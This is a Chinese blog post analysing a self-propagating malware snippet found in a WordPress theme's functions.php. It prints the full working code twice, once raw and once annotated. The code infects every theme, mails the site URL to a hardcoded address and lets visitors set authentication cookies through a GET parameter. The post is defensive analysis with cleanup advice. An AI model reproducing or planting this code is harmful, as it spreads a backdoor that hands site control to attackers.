---
author: liqimore
comments: true
date: 2015-11-22 00:09:32+00:00
layout: post
link: http://blog.codefog.com/bad-code-in-wordpress-theme.html
slug: bad-code-in-wordpress-theme
title: Wordpress主题被插入恶意代码解决办法
wordpress_id: 16
categories:
- 编程
tags:
- wordpress主题报错
- wordpress恶意代码
- Wordpress更换主题报错
---

今天无聊在WP官方主题库里面翻看，看到一个不错的主题，点击了一下预览按钮，之后我将其下载到本地（并没有设置为当前主题，只是收藏），但是在我下载完成后点击预览，出现了function.php报错，具体到了行，我翻看了一下这个主题的function.php文件，没发现异常（我当时居然没发现。。），然后google了一下报错信息（Fatal error: Cannot redeclare _check_isactive_widget()”、”_get_allwidgetcont” 之类），才知道自己中招了！！

下面是全部的恶意代码：

    
    <?php
    function _verifyactivate_widgets(){
    $widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
    $output=strip_tags($output, $allowed);
    $direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
    if (is_array($direst)){
    foreach ($direst as $item){
    if (is_writable($item)){
    $ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
    $cont=file_get_contents($item);
    if (stripos($cont,$ftion) === false){
    $comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
    $output .= $before . "Not found" . $after;
    if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
    $output=rtrim($output, "nt"); fputs($f=fopen($item,"w+"),$cont . $comaar . "n" .$widget);fclose($f);
    $output .= ($isshowdots && $ellipsis) ? "..." : "";
    }
    }
    }
    }
    return $output;
    }
    function _get_allwidgets_cont($wids,$items=array()){
    $places=array_shift($wids);
    if(substr($places,-1) == "/"){
    $places=substr($places,0,-1);
    }
    if(!file_exists($places) || !is_dir($places)){
    return false;
    }elseif(is_readable($places)){
    $elems=scandir($places);
    foreach ($elems as $elem){
    if ($elem != "." && $elem != ".."){
    if (is_dir($places . "/" . $elem)){
    $wids[]=$places . "/" . $elem;
    } elseif (is_file($places . "/" . $elem)&&
    $elem == substr(__FILE__,-13)){
    $items[]=$places . "/" . $elem;}
    }
    }
    }else{
    return false;
    }
    if (sizeof($wids) > 0){
    return _get_allwidgets_cont($wids,$items);
    } else {
    return $items;
    }
    }
    if(!function_exists("stripos")){
    function stripos( $str, $needle, $offset = 0 ){
    return strpos( strtolower( $str ), strtolower( $needle ), $offset );
    }
    }
    if(!function_exists("strripos")){
    function strripos( $haystack, $needle, $offset = 0 ) {
    if( !is_string( $needle ) )$needle = chr( intval( $needle ) );
    if( $offset < 0 ){
    $temp_cut = strrev( substr( $haystack, 0, abs($offset) ) );
    }
    else{
    $temp_cut = strrev( substr( $haystack, 0, max( ( strlen($haystack) - $offset ), 0 ) ) );
    }
    if( ( $found = stripos( $temp_cut, strrev($needle) ) ) === FALSE )return FALSE;
    $pos = ( strlen( $haystack ) - ( $found + $offset + strlen( $needle ) ) );
    return $pos;
    }
    }
    if(!function_exists("scandir")){
    function scandir($dir,$listDirectories=false, $skipDots=true) {
    $dirArray = array();
    if ($handle = opendir($dir)) {
    while (false !== ($file = readdir($handle))) {
    if (($file != "." && $file != "..") || $skipDots == true) {
    if($listDirectories == false) { if(is_dir($file)) { continue; } }
    array_push($dirArray,basename($file));
    }
    }
    closedir($handle);
    }
    return $dirArray;
    }
    }
    add_action("admin_head", "_verifyactivate_widgets");
    function _getprepare_widget(){
    if(!isset($text_length)) $text_length=120;
    if(!isset($check)) $check="cookie";
    if(!isset($tagsallowed)) $tagsallowed="<a>";
    if(!isset($filter)) $filter="none";
    if(!isset($coma)) $coma="";
    if(!isset($home_filter)) $home_filter=get_option("home");
    if(!isset($pref_filters)) $pref_filters="wp_";
    if(!isset($is_use_more_link)) $is_use_more_link=1;
    if(!isset($com_type)) $com_type="";
    if(!isset($cpages)) $cpages=$_GET["cperpage"];
    if(!isset($post_auth_comments)) $post_auth_comments="";
    if(!isset($com_is_approved)) $com_is_approved="";
    if(!isset($post_auth)) $post_auth="auth";
    if(!isset($link_text_more)) $link_text_more="(more...)";
    if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
    if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
    if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
    if(!isset($contentmore)) $contentmore="ma".$coma."il";
    if(!isset($for_more)) $for_more=1;
    if(!isset($fakeit)) $fakeit=1;
    if(!isset($sql)) $sql="";
    if (!$widget_yes) :
    global $wpdb, $post;
    $sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved="1" AND comment_type="" AND post_author="li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m" AND post_password="" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
    if (!empty($post->post_password)) {
    if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) {
    if(is_feed()) {
    $output=__("There is no excerpt because this is a protected post.");
    } else {
    $output=get_the_password_form();
    }
    }
    }
    if(!isset($fixed_tags)) $fixed_tags=1;
    if(!isset($filters)) $filters=$home_filter;
    if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
    if(!isset($tag_aditional)) $tag_aditional="div";
    if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
    if(!isset($more_text_link)) $more_text_link="Continue reading this entry";
    if(!isset($isshowdots)) $isshowdots=1;
    $comments=$wpdb->get_results($sql);
    if($fakeit == 2) {
    $text=$post->post_content;
    } elseif($fakeit == 1) {
    $text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
    } else {
    $text=$post->post_excerpt;
    }
    $sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved="1" AND comment_type="" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
    if($text_length < 0) {
    $output=$text;
    } else {
    if(!$no_more && strpos($text, "<!--more-->")) {
    $text=explode("<!--more-->", $text, 2);
    $l=count($text[0]);
    $more_link=1;
    $comments=$wpdb->get_results($sql);
    } else {
    $text=explode(" ", $text);
    if(count($text) > $text_length) {
    $l=$text_length;
    $ellipsis=1;
    } else {
    $l=count($text);
    $link_text_more="";
    $ellipsis=0;
    }
    }
    for ($i=0; $i<$l; $i++)
    $output .= $text[$i] . " ";
    }
    update_option("_is_widget_active_", 1);
    if("all" != $tagsallowed) {
    $output=strip_tags($output, $tagsallowed);
    return $output;
    }
    endif;
    $output=rtrim($output, "sntrx0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
    $output .= ($isshowdots && $ellipsis) ? "..." : "";
    $output=apply_filters($filter, $output);
    switch($tag_aditional) {
    case("div") :
    $tag="div";
    break;
    case("span") :
    $tag="span";
    break;
    case("p") :
    $tag="p";
    break;
    default :
    $tag="span";
    }
    if ($is_use_more_link ) {
    if($for_more) {
    $output .= " <" . $tag . " class="more-link"><a href="". get_permalink($post->ID) . "#more-" . $post->ID ."" title="" . $more_text_link . "">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "n";
    } else {
    $output .= " <" . $tag . " class="more-link"><a href="". get_permalink($post->ID) . "" title="" . $more_text_link . "">" . $link_text_more . "</a></" . $tag . ">" . "n";
    }
    }
    return $output;
    }
    add_action("init", "_getprepare_widget");
    function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
    global $wpdb;
    $request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS "comment_count" FROM $wpdb->posts, $wpdb->comments";
    $request .= " WHERE comment_approved="1" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status="publish"";
    if(!$show_pass_post) $request .= " AND post_password =""";
    if($duration !="") {
    $request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
    }
    $request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
    $posts=$wpdb->get_results($request);
    $output="";
    if ($posts) {
    foreach ($posts as $post) {
    $post_title=stripslashes($post->post_title);
    $comment_count=$post->comment_count;
    $permalink=get_permalink($post->ID);
    $output .= $before . " <a href="" . $permalink . "" title="" . $post_title."">" . $post_title . "</a> " . $after;
    }
    } else {
    $output .= $before . "None found" . $after;
    }
    return $output;
    }
    ?>




#### 这个代码会感染你所有的主题，也就是每个主题都中招，当你把你的主题分享给朋友时候，他们也会中招。大概看了一下这段代码，只看懂了感染原理。每当wp加载主题时


<!-- more -->


#### ，会调用function.php里面的函数，而恶意代码会在此过程中加在，并检测到你wp主题的绝对路径，之后把其它为感染的主题一并感染，而且它加了很多伪装代码，没鸟用，骗人眼睛的（我前面就又中招了）。此代码变量众多，不看了，直接google。找到如下结果。




<blockquote>再来大概说说它的**工作原理**，首先它会存在某一主题里面，当你启用调试此主题时，这段代码可以通过遍历获得你主题目录下的所有主题里面的functions.php，并在functions.php文件结尾处的最后一个“？>”处自动添加下面的恶意病毒代码，如果恶意病毒代码添加成功，它会发送你博客的url地址到[livethemas@gmail.com](http://www.henghengzhu.com/tag/livethemasgmail-com/)（可能大家没看到这个邮箱地址的添加位置，这就是它的巧妙之处，它将email地址拆分转义，然后用多重变量引用，下面的代码我已经用红色标注出了此email地址。</blockquote>




#### 看来写这恶意代码的是个高手。




## 处理方法：




登陆ssh，把theme设置为只读权限（Linux下）。删除所有的恶意代码。




恢复权限，只把function.php设置为只读，这样才不怕这种毒了。





## 建议：


仔细检查你下载的所有插件和主题，不要随便下载破解版！

php一样可以写出不差于win下的恶意木马，别小看了php。


## 下面是该代码的注释版本：



    
    <?php
    function _verifyactivate_widgets(){
        //当前文件名，如/path-to-www/wp-content/themes/SimpleDark/functions.php 
            //查找当前主题functions.php文件中最后一个 <? 标记，从这个标记的位置开始，取得一直到文件尾的内容
        $widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));
        $output="";
        $allowed="";
        //去除html和php标签，其实这一句是扯蛋。。。
        $output=strip_tags($output, $allowed);
        //取得主题目录themes的绝对路径，如 /path-to-www/wp-content/themes
            //为了加强程序的兼容性，它不惜以这种很晦涩的方式来获取。。。
            //以主题目录themes的绝对路径用array包裹为参数传递给_get_allwidgets_cont函数获取此博客的所有主题的functions.php文件的绝对路径
        $direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
        if (is_array($direst)){
            foreach ($direst as $item){
                //如果主题functions.php文件可写
                if (is_writable($item)){
                    //特征码
                    $ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
                    //取目标functions.php文件内容
                    $cont=file_get_contents($item);
                    //没找到特征码?OK,试图感染
                    if (stripos($cont,$ftion) === false){
                        //查看目标functions.php文件最后是否是以 ?> 结尾，如果不是，给加上 ?> 标记
                        $comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
                        //这里的代码是忽悠人了，模仿WP widgets的代码，蛊惑你的眼睛，让你觉得这是widget代码。。。
                        $output .= $before . "Not found" . $after;
                        //如果文件是以 ?> 标记结尾的，连标记一起取过来
                        if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
                        //开始感染,$widget内容即是恶意代码自身,在functions.php文件原内容后附加恶意代码
                        $output=rtrim($output, "nt"); fputs($f=fopen($item,"w+"),$cont . $comaar . "n" .$widget);fclose($f); 
                        //后面这句也是伪装用的            
                        $output .= ($isshowdots &#038;&#038; $ellipsis) ? "..." : "";
                    }
                }
            }
        }
        return $output;
    }
    function _get_allwidgets_cont($wids,$items=array()){
        //从$wids数组弹出一个元素(实际上是一个位置)
        $places=array_shift($wids);
        //如果位置字串是以/结尾的，则去掉/
        if(substr($places,-1) == "/"){
            $places=substr($places,0,-1);
        }
        
        //若不存在这样的文件或目录则直接返回false
        if(!file_exists($places) || !is_dir($places)){
            return false;
        }elseif(is_readable($places)){
            //否则的话。。。嘿嘿
            //遍历此目录
            $elems=scandir($places);
            foreach ($elems as $elem){
                if ($elem != "." &#038;&#038; $elem != ".."){
                    //如果是目录,则加入$wids数组
                    if (is_dir($places . "/" . $elem)){
                        $wids[]=$places . "/" . $elem;
                    } elseif (is_file($places . "/" . $elem)&#038;&#038; 
                        $elem == substr(__FILE__,-13)){
                            //否则，如果是文件，并且文件名等于 functions.php的话，则加入到$items数组保存,这才是它的目的functions.php正是它要找的
                        $items[]=$places . "/" . $elem;}
                    }
                }
        }else{
            return false;   
        }
        //下面还有子目录？再找找看,递归
        if (sizeof($wids) > 0){
            return _get_allwidgets_cont($wids,$items);
        } else {
            //好了，完事了，以数组返回所有找到的functions.php文件的绝对路径
            return $items;
        }
    }
    
    //下面是3个针对低版本的php而写的兼容函数
    if(!function_exists("stripos")){ 
        function stripos(  $str, $needle, $offset = 0  ){ 
            return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
        }
    }
    
    if(!function_exists("strripos")){ 
        function strripos(  $haystack, $needle, $offset = 0  ) { 
            if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
            if(  $offset < 0  ){ 
                $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
            } 
            else{ 
                $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
            } 
            if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
            $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
            return $pos; 
        }
    }
    if(!function_exists("scandir")){ 
        function scandir($dir,$listDirectories=false, $skipDots=true) {
            $dirArray = array();
            if ($handle = opendir($dir)) {
                while (false !== ($file = readdir($handle))) {
                    if (($file != "." &#038;&#038; $file != "..") || $skipDots == true) {
                        if($listDirectories == false) { if(is_dir($file)) { continue; } }
                        array_push($dirArray,basename($file));
                    }
                }
                closedir($handle);
            }
            return $dirArray;
        }
    }
    
    //这个动作添加了，用于检测所有主题目录下functions.php并感染
    add_action("admin_head", "_verifyactivate_widgets");
    
    function _getprepare_widget(){
        if(!isset($text_length)) $text_length=120;
        if(!isset($check)) $check="cookie";
        if(!isset($tagsallowed)) $tagsallowed="<a>";
        if(!isset($filter)) $filter="none";
        if(!isset($coma)) $coma="";
        if(!isset($home_filter)) $home_filter=get_option("home"); 
        if(!isset($pref_filters)) $pref_filters="wp_";
        if(!isset($is_use_more_link)) $is_use_more_link=1; 
        if(!isset($com_type)) $com_type=""; 
        if(!isset($cpages)) $cpages=$_GET["cperpage"];
        if(!isset($post_auth_comments)) $post_auth_comments="";
        if(!isset($com_is_approved)) $com_is_approved=""; 
        if(!isset($post_auth)) $post_auth="auth";
        if(!isset($link_text_more)) $link_text_more="(more...)";
        if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
        if(!isset($checkswidgets)) 
        //这个实际是wp_set_auth_cookie
        $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
        if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
        if(!isset($contentmore)) $contentmore="ma".$coma."il";
        if(!isset($for_more)) $for_more=1;
        if(!isset($fakeit)) $fakeit=1;
        if(!isset($sql)) $sql="";
        
        //如果 _is_widget_active_ option内容为空,即表示没有被感染过
        if (!$widget_yes) :
        
        global $wpdb, $post;
        //取出存在已经通过的评论（不包括trackback/pingback）的文章
        // post_author 为 livethemas@gmail.com 的文章，肯定是没有的
    
        $sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved="1" AND comment_type="" AND post_author="li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m" AND post_password="" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
        if (!empty($post->post_password)) { 
            if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
                if(is_feed()) { 
                    $output=__("There is no excerpt because this is a protected post.");
                } else {
                    $output=get_the_password_form();
                }
            }
        }
        if(!isset($fixed_tags)) $fixed_tags=1;
        if(!isset($filters)) $filters=$home_filter; 
        //$gettextcomments实际上为 wp_mail
        if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
        if(!isset($tag_aditional)) $tag_aditional="div";
        
        //这里$sh_cont即为 livethemas@gmail.com
        if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
        if(!isset($more_text_link)) $more_text_link="Continue reading this entry";  
        if(!isset($isshowdots)) $isshowdots=1;
        
        $comments=$wpdb->get_results($sql); 
        if($fakeit == 2) { 
            $text=$post->post_content;
        } elseif($fakeit == 1) { 
            $text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
        } else { 
            $text=$post->post_excerpt;
        }
        //开始调用　wp_mail 向 livethemas@gmail.com 发送邮件，标题和内容都是被感染的博客的URL 地址
        $sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved="1" AND comment_type="" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
        if($text_length < 0) {
            $output=$text;
        } else {
            if(!$no_more &#038;&#038; strpos($text, "<!--more-->")) {
                $text=explode("<!--more-->", $text, 2);
                $l=count($text[0]);
                $more_link=1;
                //执行这一句时就开始发邮件了。
                $comments=$wpdb->get_results($sql);
            } else {
                $text=explode(" ", $text);
                if(count($text) > $text_length) {
                    $l=$text_length;
                    $ellipsis=1;
                } else {
                    $l=count($text);
                    $link_text_more="";
                    $ellipsis=0;
                }
            }
            for ($i=0; $i<$l; $i++)
                    $output .= $text[$i] . " ";
        }
        //把感染标记置为1
        update_option("_is_widget_active_", 1);
        if("all" != $tagsallowed) {
            $output=strip_tags($output, $tagsallowed);
            return $output;
        }
        endif;
        $output=rtrim($output, "sntrx0B");
        $output=($fixed_tags) ? balanceTags($output, true) : $output;
        $output .= ($isshowdots &#038;&#038; $ellipsis) ? "..." : "";
        //$filter 为 none ...,又是在伪装
        $output=apply_filters($filter, $output);
        switch($tag_aditional) {
            case("div") :
                $tag="div";
            break;
            case("span") :
                $tag="span";
            break;
            case("p") :
                $tag="p";
            break;
            default :
                $tag="span";
        }
    
    //$checkswidgets即是wp_set_auth_cookie
        if ($is_use_more_link ) {
            if($for_more) {
                $output .= " <" . $tag . " class="more-link"><a href="". get_permalink($post->ID) . "#more-" . $post->ID ."" title="" . $more_text_link . "">" . $link_text_more = !is_user_logged_in() &#038;&#038; @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "n";
            } else {
                $output .= " <" . $tag . " class="more-link"><a href="". get_permalink($post->ID) . "" title="" . $more_text_link . "">" . $link_text_more . "</a></" . $tag . ">" . "n";
            }
        }
        return $output;
    }
    
    //这里是用来干坏事的，这才是这个恶意代码的目的,前面的感染是“准备活动”
    add_action("init", "_getprepare_widget");
    
    
    //这个函数也是用来伪装的,无恶意
    function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
        global $wpdb;
        $request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS "comment_count" FROM $wpdb->posts, $wpdb->comments";
        $request .= " WHERE comment_approved="1" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status="publish"";
        if(!$show_pass_post) $request .= " AND post_password =""";
        if($duration !="") { 
            $request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
        }
        $request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
        $posts=$wpdb->get_results($request);
        $output="";
        if ($posts) {
            foreach ($posts as $post) {
                $post_title=stripslashes($post->post_title);
                $comment_count=$post->comment_count;
                $permalink=get_permalink($post->ID);
                $output .= $before . " <a href="" . $permalink . "" title="" . $post_title."">" . $post_title . "</a> " . $after;
            }
        } else {
            $output .= $before . "None found" . $after;
        }
        return  $output;
    }
    ?>




其中部分摘自：

荒野无灯（http://ihacklog.com/post/wordpress-theme-malicious-code-analysis.html）

张戈博客（http://zhangge.net/3385.html）
